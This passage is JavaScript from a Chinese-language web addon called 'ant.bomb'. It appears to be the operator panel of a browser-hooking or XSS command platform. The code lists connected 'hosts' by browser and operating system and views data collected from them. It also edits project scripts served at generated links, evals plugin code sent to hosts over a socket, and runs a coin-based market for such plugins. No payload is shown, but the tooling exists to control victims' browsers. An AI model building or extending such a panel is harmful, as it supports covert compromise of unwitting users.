                }
                temp.browser = {
                    'Safari': /Safari\/([\d\.]+)$/,
                    'Chrome': /Chrome\/([\d\.]+)/,
                    'Firefox': /Firefox\/([\d\.]+)$/,
                    'Opera/': /Version\/([\d\.]+)$/,
                    'MSIE': /MSIE ([\d\.]+)/,
                    'Lunascape': /Lunascape ([\d\.]+)/,
                    'Netscape': /Netscape6[\d]?\/([\d\.]+)/,
                    'CriOS': /CriOS\/([\d\.]+)/,
                    'UCBrowser': /UCBrowser\/([\d\.]+)/,
                    'Trident': /Trident\/([\d\.]+)/,
                    'baiduboxapp': /baiduboxapp\/([\d\.\_]+)/,
                    'MiuiBrowser': /MiuiBrowser\/([\d\.]+)$/
                }
                for (var b in temp.browser){
                    if (info.ua.indexOf(b)) {
                        var m = info.ua.match(temp.browser[b]);
                        info.browser = m ? m[0] : (info.browser || 'Unknow Browser');
                    };
                }
                return {
                    os: info.os,
                    browser: info.browser
                }
            },
            //= 删除主机
            del: function(ids) {
                var self = this;
                w2confirm('确定删除所选的(' + ids.length + ')个主机吗?', '<i class="fa fa-trash-o"></i> 删除主机', function(btn) {
                    if (btn === 'Yes') {
                        ADDON.lock('删除主机中..');
                        $.post('/addons/ant.bomb/hosts/del', {
                            ids: ids
                        }, function(data) {
                            ADDON.unlock();
                            if (data.ret) {
                                ADDON.success('删除主机成功!');
                                ids.forEach(function(id) {
                                    delete self.cache[id];
                                });
                                self.reload();
                            }else{
                                ADDON.error('删除主机失败!<br>' + data.err);
                            }
                        })
                    };
                })
            },
            //= 项目数据
            data: function(id) {
                var self = this,
                    host = self.cache[id],
                    editor = null;
                w2popup.open({
                    title: '<i class="fa fa-database"></i> 项目数据',
                    width: 650,
                    height: 500,
                    showMax: true,
                    modal: true,
                    style: 'padding: 0',
                    body: '<div id="bomb_hosts_data_div" style="width:100%;height:100%;"></div>',
                    onOpen: function(event) {
                        event.onComplete = function() {
                            var _mode  = require('ace/mode/markdown').Mode;
                            editor = ace.edit('bomb_hosts_data_div');
                            editor.setTheme('ace/theme/tomorrow');
                            editor.setReadOnly(true);
                            editor.session.setMode(new _mode());
                            editor.session.setUseWrapMode(true);
                            if (host.online || host.data === null) {
                                w2popup.lock('加载数据中..', true);
                                $.post('/addons/ant.bomb/hosts/data', {
                                    id: id
                                }, function(data) {
                                    w2popup.unlock();
                                    if (data.err) {
                                        return ADDON.error('加载数据失败!<br>' + data.err);
                                    };
                                    host.data = data.ret;
                                    editor.session.setValue(host.data);
                                });
                            }else{
                                editor.session.setValue(host.data);
                            }
                        }
                    },
                    onToggle: function(event) {
                        event.onComplete = function() {
                            editor.resize();
                        }
                    }
                })
            },
            //= 加载插件
            loadPlugin: function(id, sid) {
                var self = this,
                    plugin = ADDON.plugin.private.cache[id];
                if (!plugin) {
                    return ADDON.error('不存在此插件!');
                };
                try{
                    var RUN = eval(plugin.code.client);
                    RUN(
                        new ADDON.api.ui(plugin),
                        new ADDON.api.api(plugin, ADDON.socket, sid),
                        plugin.code.server
                    )
                } catch(e) {
                    ADDON.error('加载插件失败!<br>' + e.message);
                    w2popup.close();
                }
            }
        },
        project: {
            cache: null,
            editor: null,
            //= 添加项目
            add: function() {
                var self = this;
                w2popup.open({
                    title: '<i class="fa fa-plus-circle"></i> 添加项目',
                    body: '<div id="form_bomb_project_div"></div>',
                    style : 'padding: 15px 0 0 0',
                    modal: true,
                    width: 500,
                    height: 300,
                    onOpen: function(event) {
                        event.onComplete = function() {
                            var form = $.extend({}, ADDON.ui['form_bomb_project'], {
                                actions: {
                                    '添加': function() {
                                        if (this.validate().length === 0) {
                                            w2popup.lock('添加项目中..', true);
                                            $.post('/addons/ant.bomb/project/add', this.record, function(data) {
                                                if (data.ret) {
                                                    w2popup.close();
                                                    ADDON.success('添加项目成功!');
                                                    self.cache[data.ret._id] = data.ret;
                                                    self.reload();
                                                }else{
                                                    ADDON.error('添加项目失败!<br>' + data.err)
                                                }
                                            })
                                        };
                                    }
                                }
                            })
                            $('#form_bomb_project_div').w2form(form);
                        }
                    },
                    onClose: function(event) {
                        w2ui['form_bomb_project'].destroy();
                    }
                })
            },
            refresh: function() {
                var self = this;
                ADDON.content(w2ui['grid_bomb_project']);
                if (!self.cache) {
                    self.cache = {};
                    ADDON.lock('加载项目数据中..')
                    $.get('/addons/ant.bomb/project/data', function(data) {
                        if (data.err) {
                            ADDON.unlock();
                            ADDON.error('加载数据失败!<br>' + data.err);
                        }else{
                            data.ret.forEach(function(i) {
                                self.cache[i._id] = i;
                            })
                            self.reload();
                        }
                    })
                }
            },
            reload: function() {
                var self = this,
                    link = document.URL.split('#')[0],
                    records = [];
                for (var i in self.cache) {
                    var project = self.cache[i];
                    if (project) {
                        var _link = link + 'b/' + project.pid;
                        records.push({
                            recid: records.length + 1,
                            _id: project._id,
                            name: w2utils.encodeTags(project.name),
                            link: w2utils.encodeTags(_link),
                            ctime: ANT.ftime(project.ctime),
                            _ctime: project.ctime,
                            utime: ANT.ftime(project.utime)
                        })
                    };
                }
                w2ui['grid_bomb_project'].records = records;
                w2ui['grid_bomb_project'].sort('_ctime', 'desc');
                w2ui['grid_bomb_project'].refresh();
                setTimeout(function() {
                    w2ui.sidebar.set('bomb_project', {
                        count: records.length
                    });
                    ADDON.unlock();
                }, 100);
            },
            //= 删除项目
            del: function(ids) {
                var self = this;
                w2confirm('确定删除所选的(' + ids.length + ')条项目吗?', '<i class="fa fa-trash-o"></i> 删除项目', function(btn) {
                    if (btn === 'Yes') {
                        ADDON.lock('删除项目中..');
                        $.post('/addons/ant.bomb/project/del', {
                            ids: ids
                        }, function(data) {
                            ADDON.unlock();
                            if (!data.err) {
                                ADDON.success('删除项目成功!');
                                ids.forEach(function(id) {
                                    delete self.cache[id];
                                })
                                self.reload();
                            }else{
                                ADDON.error('删除项目失败!');
                            }
                        })
                    };
                })
            },
            //= 更改设置
            reset: function(id) {
                var self = this,
                    project = self.cache[id];
                w2popup.open({
                    title: '<i class="fa fa-cog"></i> 更改设置',
                    body: '<div id="form_bomb_project_div"></div>',
                    style : 'padding: 15px 0 0 0',
                    modal: true,
                    width: 500,
                    height: 300,
                    onOpen: function(event) {
                        event.onComplete = function() {
                            var form = $.extend({}, ADDON.ui['form_bomb_project'], {
                                record: {
                                    name: project.name,
                                    desc: project.desc
                                },
                                actions: {
                                    '更新': function() {
                                        var _record = this.record;
                                        if (this.validate().length === 0) {
                                            w2popup.lock('更新项目中..', true);
                                            $.post('/addons/ant.bomb/project/update', {
                                                id: id,
                                                name: _record.name,
                                                desc: _record.desc
                                            }, function(data) {
                                                if (data.ret) {
                                                    w2popup.close();
                                                    ADDON.success('更新插项目成功!');
                                                    project = $.extend({}, project, _record, {
                                                        utime: new Date()
                                                    });
                                                    self.cache[id] = project;
                                                    self.reload();
                                                }else{
                                                    ADDON.error('更新项目失败!<br>' + data.err)
                                                }
                                            })
                                        };
                                    }
                                }
                            })
                            $('#form_bomb_project_div').w2form(form);
                        }
                    },
                    onClose: function(event) {
                        w2ui['form_bomb_project'].destroy();
                    }
                })
            },
            //= 编辑项目
            edit: function(id) {
                var self = this,
                    project = self.cache[id];
                w2popup.open({
                    title: '<i class="fa fa-edit"></i> 编辑项目:<strong class="text-danger">' + w2utils.encodeTags(project.name) + '</strong>',
                    body: '<div id="bomb_project_editor_div" style="width: 100%;height: 100%;"></div>',
                    style: 'padding: 0;',
                    showMax: true,
                    modal: true,
                    width: 900,
                    height: 600,
                    onOpen: function(event) {
                        event.onComplete = function() {
                            $('#bomb_project_editor_div').w2render(w2ui['layout_bomb_project_edit']);
                            var jsMode = require('ace/mode/javascript').Mode;
                            self.editor = ace.edit('layout_bomb_project_edit_div');
                            self.editor.setTheme('ace/theme/tomorrow');
                            self.editor.session.setMode(new jsMode());
                            self.editor.session.setUseWrapMode(true);
                            self.editor.session.setValue(project.code);
                            //@ 初始化工具栏
                            var loadMenu = function() {
                                var _plugins = ADDON.plugin.private.cache,
                                    _temp = [];
                                for (var _p in _plugins) {
                                    _temp.push({
                                        id: _p,
                                        text: w2utils.encodeTags(_plugins[_p].name),
                                        icon: 'fa fa-puzzle-piece'
                                    });
                                }
                                w2ui['layout_bomb_project_edit_main_toolbar'].set('plugin', {
                                    items: _temp,
                                    count: _temp.length,
                                    disabled: _temp.length === 0
                                });
                            };
                            if (!ADDON.plugin.private.cache) {
                                ADDON.plugin.private.refresh(function() {
                                    loadMenu();
                                })
                            }else{
                                loadMenu();
                            }
                            //@ 工具栏点击
                            w2ui['layout_bomb_project_edit_main_toolbar'].onClick = function(event) {
                                var _code = self.editor.session.getValue();
                                switch(event.target) {
                                    case 'save':
                                        //- 保存代码
                                        w2popup.lock('保存代码中..', true);
                                        $.post('/addons/ant.bomb/project/save', {
                                            id: id,
                                            code: _code
                                        }, function(data) {
                                            w2popup.unlock();
                                            if (data.err) {
                                                ADDON.error('代码保存失败!<br>' + data.err);
                                            }else{
                                                project.code = _code;
                                                project.utime = new Date();
                                                self.reload();
                                                ADDON.success('代码保存成功!');
                                            }
                                        });
                                        break;
                                    default:
                                        if (event.target.indexOf('plugin:') === 0) {
                                            var _id = event.target.replace('plugin:', ''),
                                                _pg = ADDON.plugin.private.cache[_id],
                                                _txt = '';
                                            if (!_pg) {
                                                return ADDON.error('没有此插件!');
                                            };
                                            _txt = '\n    // 加载插件: ' + _pg.name;
                                            _txt += '\n    // 插件说明: ' + _pg.desc.replace(/\n/g, '\\n') + '\n    ';
                                            _txt += '{PLUGIN_' + _id + '}(api);\n    '
                                            self.editor.insert(_txt);
                                        };
                                }
                            };
                            //@ 编辑器快捷键
                            [{
                                name: 'saveCmd',
                                bindKey: {
                                    win: 'Ctrl-S',
                                    mac: 'Command-S'
                                },
                                exec: function(editor) {
                                    w2ui['layout_bomb_project_edit_main_toolbar'].click('save');
                                }
                            }, {
                                name: 'toggleCmd',
                                bindKey: {
                                    win: 'Ctrl-M',
                                    mac: 'Command-M'
                                },
                                exec: function() {
                                    w2popup.toggle();
                                }
                            }].forEach(function(key) {
                                self.editor.commands.addCommand(key);
                            })
                            w2popup.toggle();
                        }
                    },
                    onToggle: function(event) {
                        event.onComplete = function() {
                            w2ui['layout_bomb_project_edit'].resize();
                            self.editor.resize();
                        }
                    }
                })
            }
        },
        plugin: {
            public: {
                cache: null,
                refresh: function() {
                    var self = this;
                    ADDON.content(w2ui['grid_bomb_plugin_public']);
                    if (!self.cache) {
                        self.cache = {};
                        ADDON.lock('加载插件数据中..')
                        $.get('/addons/ant.bomb/plugin/public/data', function(data) {
                            if (data.err) {
                                ADDON.unlock();
                                ADDON.error('加载数据失败!<br>' + data.err);
                            }else{
                                data.ret.forEach(function(i) {
                                    self.cache[i._id] = i;
                                })
                                self.reload();
                            }
                        })
                    }
                },
                reload: function() {
                    var self = this;
                    var records = [];
                    for (var i in self.cache) {
                        var plugin = self.cache[i];
                        if (plugin) {
                            records.push({
                                recid: records.length + 1,
                                _id: plugin._id,
                                name: w2utils.encodeTags(plugin.name),
                                user: w2utils.encodeTags(plugin.user ? plugin.user.nickname : '<已删除>'),
                                coin: plugin.coin,
                                buys: plugin.buys.length,
                                utime: ANT.ftime(plugin.utime),
                                _utime: plugin.utime
                            })
                        };
                    }
                    w2ui['grid_bomb_plugin_public'].records = records;
                    w2ui['grid_bomb_plugin_public'].sort('_utime', 'desc');
                    w2ui['grid_bomb_plugin_public'].refresh();
                    setTimeout(function() {
                        w2ui.sidebar.set('bomb_plugin_public', {
                            count: records.length
                        });
                        ADDON.unlock();
                    }, 100);
                },
                //= 插件交流
                comment: function(id) {
                    var self = this,
                        plugin = self.cache[id];
                    w2popup.open({
                        title: '<i class="fa fa-comments"></i> 插件交流:<strong class="text-danger">' + w2utils.encodeTags(plugin.name) + '</strong>',
                        style: 'padding: 0',
                        width: 800,
                        height: 600,
                        modal: true,
                        showMax: true,
                        body: '<div class="comment" id="comment_' + id + '">' +
                        '<blockquote>' + w2utils.encodeTags(plugin.desc || '<暂无简介>').replace(/\n/g, '<br>') +
                        '<small>' + w2utils.encodeTags(plugin.user.nickname || '<已删除>') +
                        '</small></blockquote>' +
                        '</div>',
                        onOpen: function(event) {
                            event.onComplete = function() {
                                $('#comment_' + id).comment({
                                    key: id,
                                    url: '#!/bomb/plugin/comment/' + id,
                                    title: '插件交流 - ' + plugin.name
                                })
                            }
                        }
                    })
                },
                //= 购买插件
                buy: function(id) {
                    var self = this
                        plugin = self.cache[id];
                    w2confirm('确定使用(<strong class="text-danger">' + plugin.coin + '</strong>)蚁币购买此插件?', '<i class="fa fa-cart-plus"></i> 购买兵蚁', function(btn) {
                        if (btn === 'Yes') {
                            ADDON.lock('购买插件中..');
                            $.post('/addons/ant.bomb/plugin/public/buy', {
                                id: id
                            }, function(data) {
                                ADDON.unlock();
                                if (data.ret) {
                                    ADDON.success('购买成功!');
                                    w2ui['sidebar'].dblClick('bomb_plugin_public');
                                    setTimeout(function() {
                                        w2ui['sidebar'].dblClick('bomb_plugin_private');
                                        w2ui['sidebar'].select('bomb_plugin_private');
                                    }, 200);
                                }else{
                                    ADDON.error('购买失败!<br>' + data.err);
                                }
                            })
                        };
                    })
                }
            },
            private: {
                //= 插件缓存
                cache: null,
                //= 编辑器
                editor: {},
                //= 刷新数据
                refresh: function(fn) {
                    var self = this;
                    fn ? null : ADDON.content(w2ui['grid_bomb_plugin_private']);
                    if (!self.cache) {
                        self.cache = {};
                        ADDON.lock('加载插件数据中..')
                        $.get('/addons/ant.bomb/plugin/private/data', function(data) {
                            if (data.err) {
                                ADDON.unlock();
                                ADDON.error('加载数据失败!<br>' + data.err);
                            }else{
                                data.ret.forEach(function(i) {
                                    self.cache[i._id] = i;
                                });
                                fn ? fn() & ADDON.unlock() : self.reload();
                            }
                        })
                    }else{
                        self.reload();
                    }
                },
                //= 刷新UI
                reload: function() {
                    var self = this;
                    var records = [];
                    for (var i in self.cache) {
                        var plugin = self.cache[i];
                        if (plugin) {
                            records.push({
                                recid: records.length + 1,
                                _id: plugin._id,
                                name: w2utils.encodeTags(plugin.name),
                                public: plugin.public ? '是' : '否',
                                verify: plugin.public ? (plugin.verify ? '是' : '否') : '-',
                                ctime: ANT.ftime(plugin.ctime),
                                _ctime: plugin.ctime,
                                utime: ANT.ftime(plugin.utime),
                                style: 'color: ' + (plugin.public ? (plugin.verify ? 'rgb(22, 144, 61)': 'rgb(195, 45, 9);background-color:rgba(255, 203, 0, 0.19);'): '')
                            })
                        };
                    }
                    w2ui['grid_bomb_plugin_private'].records = records;
                    w2ui['grid_bomb_plugin_private'].sort('_ctime', 'desc');
                    w2ui['grid_bomb_plugin_private'].refresh();
                    setTimeout(function() {
                        w2ui.sidebar.set('bomb_plugin_private', {
                            count: records.length
                        });
                        ADDON.unlock();
                    }, 100);
                },
                //= 添加插件
                add: function() {
                    var self = this;
                    w2popup.open({
                        title: '<i class="fa fa-plus-circle"></i> 添加插件',
                        body: '<div id="form_bomb_plugin_private_div"></div>',
                        style : 'padding: 15px 0 0 0',
                        modal: true,
                        width: 500,
                        height: 300,
                        onOpen: function(event) {
                            event.onComplete = function() {
                                var form = $.extend({}, ADDON.ui['form_bomb_plugin_private'], {
                                    actions: {
                                        '添加': function() {
                                            if (this.validate().length === 0) {
                                                w2popup.lock('添加插件中..', true);
                                                $.post('/addons/ant.bomb/plugin/private/add', this.record, function(data) {
                                                    if (data.ret) {
                                                        w2popup.close();
                                                        ADDON.success('添加插件成功!');
                                                        self.cache[data.ret._id] = data.ret;
                                                        self.reload();
                                                        // ADDON.private.edit(data.ret._id);
                                                    }else{
                                                        ADDON.error('添加插件失败!<br>' + data.err)
                                                    }
                                                })
                                            };
                                        }
                                    }
                                })
                                $('#form_bomb_plugin_private_div').w2form(form);
                            }
                        },
                        onClose: function(event) {
                            w2ui['form_bomb_plugin_private'].destroy();
                        }
                    })
                },
                //= 删除插件
                del: function(ids) {
                    var self = this;
                    w2confirm('确定删除所选的(' + ids.length + ')条数据吗?', '<i class="fa fa-trash-o"></i> 删除插件', function(btn) {
                        if (btn === 'Yes') {
                            ADDON.lock('删除数据中..');
                            $.post('/addons/ant.bomb/plugin/private/del', {
                                ids: ids
                            }, function(data) {
                                ADDON.unlock();
                                if (!data.err) {
                                    ADDON.success('删除数据成功!');
                                    ids.forEach(function(id) {
                                        delete self.cache[id];
                                    })
                                    self.reload();
                                }else{
                                    ADDON.error('删除数据失败!');
                                }
                            })
                        };
                    })
                },
                //= 编辑插件
                edit: function(id) {
                    var self = this,
                        plugin = self.cache[id];
                    w2popup.open({
                        title: '<i class="fa fa-edit"></i> 编辑插件:<strong class="text-danger">' + w2utils.encodeTags(plugin.name) + '</strong>',
                        body: '<div id="layout_bomb_plugin_private_edit_div" style="width: 100%;height: 100%;"></div>',
                        style: 'padding: 0;',
                        showMax: true,
                        modal: true,
                        width: 900,
                        height: 600,
                        onOpen: function(event) {
                            event.onComplete = function() {
                                $("#layout_bomb_plugin_private_edit_div").w2render(w2ui['layout_bomb_plugin_private_edit']);
                                var jsMode = require('ace/mode/javascript').Mode;
                                //- 初始化编辑器:客户端
                                self.editor.client = ace.edit('layout_bomb_plugin_private_edit_client');
                                self.editor.client.setTheme('ace/theme/tomorrow');
                                self.editor.client.session.setMode(new jsMode());
                                self.editor.client.session.setUseWrapMode(true);
                                self.editor.client.session.setValue(plugin.code.client);
                                //- 初始化编辑器:服务端
                                self.editor.server = ace.edit('layout_bomb_plugin_private_edit_server');
                                self.editor.server.setTheme('ace/theme/tomorrow');
                                self.editor.server.session.setMode(new jsMode());
                                self.editor.server.session.setUseWrapMode(true);
                                self.editor.server.session.setValue(plugin.code.server);
                                //- 编辑器快捷键
                                [{
                                    name: 'saveCmd',
                                    bindKey: {
                                        win: 'Ctrl-S',
                                        mac: 'Command-S'
                                    },
                                    exec: function(editor) {
                                        w2ui['layout_bomb_plugin_private_edit_main_toolbar'].click('save');
                                    }
                                }, {
                                    name: 'toggleCmd',
                                    bindKey: {
                                        win: 'Ctrl-M',
                                        mac: 'Command-M'
                                    },
                                    exec: function() {
                                        w2popup.toggle();
                                    }
                                }].forEach(function(key) {
                                    self.editor.client.commands.addCommand(key);
                                    self.editor.server.commands.addCommand(key);
                                })
                                //- 工具栏点击事件
                                w2ui['layout_bomb_plugin_private_edit_main_toolbar'].onClick = function(event) {
                                    var c_c = self.editor.client.getValue();
                                    var s_c = self.editor.server.getValue();
                                    switch(event.target) {
                                        case 'save':
                                            //- 保存代码
                                            w2popup.lock('保存代码中..', true);
                                            $.post('/addons/ant.bomb/plugin/private/save', {
                                                id: id,
                                                client: c_c,
                                                server: s_c
                                            }, function(data) {
                                                w2popup.unlock();
                                                if (data.err) {
                                                    ADDON.error('代码保存失败!<br>' + data.err);
                                                }else{
                                                    plugin.code = {
                                                        client: c_c,
                                                        server: s_c
                                                    }
                                                    plugin.verify = false;
                                                    plugin.utime = new Date();
                                                    self.reload();
                                                    ADDON.success('代码保存成功!');
                                                }
                                            })
                                            break;
                                    }
                                }
                                w2ui['layout_bomb_plugin_private_edit_main_tabs'].click('client');
                                w2popup.toggle();
                            }
                        },
                        onToggle: function(event) {
                            event.onComplete = function() {
                                w2ui['layout_bomb_plugin_private_edit'].resize();
                                self.editor.client.resize();
                                self.editor.server.resize();
                            }
                        }
                    })
                },
                //= 更改设置
                reset: function(id) {
                    var self = this,
                        plugin = self.cache[id];
                    w2popup.open({
                        title: '<i class="fa fa-cog"></i> 更改设置',
                        body: '<div id="form_bomb_plugin_private_div"></div>',
                        style : 'padding: 15px 0 0 0',
                        modal: true,
                        width: 500,
                        height: 300,
                        onOpen: function(event) {
                            event.onComplete = function() {
                                var form = $.extend({}, ADDON.ui['form_bomb_plugin_private'], {
                                    record: {
                                        name: plugin.name,
                                        desc: plugin.desc
                                    },
                                    actions: {
                                        '更新': function() {
                                            var _record = this.record;
                                            if (this.validate().length === 0) {
                                                w2popup.lock('更新插件中..', true);
                                                $.post('/addons/ant.bomb/plugin/private/update', {
                                                    id: id,
                                                    name: _record.name,
                                                    desc: _record.desc
                                                }, function(data) {
                                                    if (data.ret) {
                                                        w2popup.close();
                                                        ADDON.success('更新插件成功!');
                                                        plugin = $.extend({}, plugin, _record, {
                                                            utime: new Date(),
                                                            verify: false
                                                        });
                                                        self.cache[id] = plugin;
                                                        self.reload();
                                                    }else{
                                                        ADDON.error('更新插件失败!<br>' + data.err)
                                                    }
                                                })
                                            };
                                        }
                                    }
                                })
                                $('#form_bomb_plugin_private_div').w2form(form);
                            }
                        },
                        onClose: function(event) {
                            w2ui['form_bomb_plugin_private'].destroy();
                        }
                    })
                },
                //= 出售插件
                sell: function(id) {
                    var self = this,
                        plugin = self.cache[id];
                    w2popup.open({
                        title: '<i class="fa fa-money"></i> 出售插件',
                        width: 400,
                        height: 250,
                        modal: true,
                        body: '<div id="form_bomb_plugin_private_sell_div" style="width:100%;height:100%;"></div>',
                        style: 'padding:50px 0 0 0;',
                        onOpen: function(event) {
                            event.onComplete = function() {
                                var form = $.extend({}, ADDON.ui.form_bomb_plugin_private_sell, {
                                    actions: {
                                        '出售': function() {
                                            if (this.validate().length === 0) {
                                                w2popup.lock('提交出售中..', true);
                                                $.post('/addons/ant.bomb/plugin/private/sell', {
                                                    id: id,
                                                    coin: this.record.coin
                                                }, function(data) {
                                                    if (data.ret) {
                                                        w2popup.close();
                                                        ADDON.success('发布出售成功!请耐心等待审核!');
                                                        plugin.public = true;
                                                        plugin.verify = false;
                                                        self.reload();
                                                    }else{
                                                        ADDON.error('发布出售失败!<br>' + data.err);
                                                    }
                                                })
                                            };
                                        }
                                    }
                                });
                                $('#form_bomb_plugin_private_sell_div').w2form(form);
                            }
                        },
                        onClose: function() {
                            w2ui['form_bomb_plugin_private_sell'].destroy();
                        }
                    })
                },
                //= 取消出售
                cancel: function(id) {
                    var self = this,
                        plugin = self.cache[id];
                    w2confirm('确定取消出售所选插件?', '<i class="fa fa-remove"></i> 取消出售', function(btn) {
                        if (btn === 'Yes') {
                            ADDON.lock('取消出售插件中..');
                            $.post('/addons/ant.bomb/plugin/private/cancel', {
                                id: id
                            }, function(data) {
                                ADDON.unlock();
                                if (data.ret) {
                                    plugin.public = false;
                                    plugin.verify = false;
                                    self.reload();
                                    ADDON.success('取消出售成功!');
                                }else{
                                    ADDON.error('取消出售失败!<br>' + data.err);
                                }
                            })
                        };
                    })
                }
            }
        },
        setting: {
            //= 获取本地保存配置信息
            get: function(opt) {
                var _setting = JSON.parse(localStorage.getItem('bomb_notify')) || {
                    sendmail: false,
                    notify: false,
                    toastr: true,
                    audio_online: '/ant/res/online.wav',
                    audio_offline: '/ant/res/offline.wav'
                };
                return opt ? _setting[opt] : _setting;
            },
            //= 保存本地设置
            set: function(obj) {
                localStorage.setItem('bomb_notify', JSON.stringify(obj));
            },
            open: function() {
                var self = this;
                w2popup.open({
                    title: '<i class="fa fa-bell"></i> 通知提醒',
                    style: 'padding: 0px;',
                    modal: true,
                    showMax: false,
                    width: 600,
                    height: 450,
                    body: '<div id="bomb_notify_div" style="width:100%;height:100%;"></div>',
                    onOpen: function(event) {
                        event.onComplete = function() {
                            w2ui['form_bomb_notify'].record = self.get();
                            $('#bomb_notify_div').w2render(w2ui['form_bomb_notify']);
                        }
                    }
                })
            }
        }
    };
    ANT.initAddon({
        id: 'ant_bomb',
        text: '蚁弹超人',
        group: true,
        expanded: true,
        nodes: [{
            id: 'bomb_hosts',
            text: '主机列表',
            icon: 'fa fa-reorder',
            onClick: function() {
                ADDON.hosts.refresh();
            },
            onDblClick: function() {
                delete ADDON.hosts.cache;
                ADDON.hosts.refresh();
            }
        }, {
            id: 'bomb_project',
            text: '项目列表',
            icon: 'fa fa-pie-chart',
            onClick: function() {
                ADDON.project.refresh();
            }
        }, {
            id: 'bomb_plugin',
            text: '插件列表',
            icon: 'fa fa-folder-open-o',
            onClick: function() {
                w2ui['sidebar'].expand('bomb_plugin');
            },
            nodes: [{
                id: 'bomb_plugin_public',
                icon: 'fa fa-puzzle-piece',
                text: '共有插件',
                onClick: function() {
                    w2ui['sidebar'].expand('bomb_plugin');
                    ADDON.plugin.public.refresh();
                },
                onDblClick: function() {
                    delete ADDON.plugin.public.cache;
                    ADDON.plugin.public.refresh();
                }
            }, {
                id: 'bomb_plugin_private',
                icon: 'fa fa-puzzle-piece',
                text: '私有插件',
                onClick: function() {
                    w2ui['sidebar'].expand('bomb_plugin');
                    ADDON.plugin.private.refresh();
                },
                onDblClick: function() {
                    delete ADDON.plugin.private.cache;
                    ADDON.plugin.private.refresh();
                }
            }]
        }, {
            id: 'bomb_notify',
            text: '通知提醒',
            icon: 'fa fa-bell-o',
            onClick: function() {
                ADDON.setting.open();
            }
        }]
    }, ADDON)
})(jQuery)